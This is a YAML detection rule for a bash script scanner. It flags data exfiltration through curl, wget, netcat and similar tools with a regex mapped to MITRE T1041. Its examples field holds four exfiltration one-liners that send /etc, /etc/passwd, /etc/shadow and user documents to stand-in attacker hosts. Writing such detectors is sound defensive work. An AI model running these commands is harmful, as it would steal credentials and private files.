# Bash Pattern: Data Exfiltration via Network
# Detects data exfiltration using network tools

id: BASH-009
name: Data Exfiltration via Network
description: |
  Detects attempts to exfiltrate data using common network tools and protocols.
  Attackers use curl, wget, nc, and other tools to send stolen data to external
  servers. This pattern identifies suspicious data transmission patterns including
  POST requests with file contents and netcat data transfers.
languages:
  - bash
detection_type: regex
detection_logic: '(?:curl.*-(?:d|F|T).*(?:@|<)|wget.*--post-file|nc.*<|tar.*\|.*(?:curl|nc|ssh)|base64.*\|.*(?:curl|nc))'
severity: High
mitre_technique: T1041
confidence: 0.8
category: exfiltration
enabled: true
metadata:
  author: Script Sentinel Team
  created: "2025-11-17"
  updated: "2025-11-17"
  references:
    - "https://attack.mitre.org/techniques/T1041/"
    - "https://attack.mitre.org/tactics/TA0010/"
  tags:
    - bash
    - exfiltration
    - data-theft
    - network
  examples:
    - "tar czf - /etc | curl -X POST -d @- http://attacker.com/upload"
    - "cat /etc/passwd | base64 | curl -d @- http://evil.com/collect"
    - "tar czf - /home/user/documents | nc attacker.com 4444"
    - "wget --post-file=/etc/shadow http://attacker.com/receive"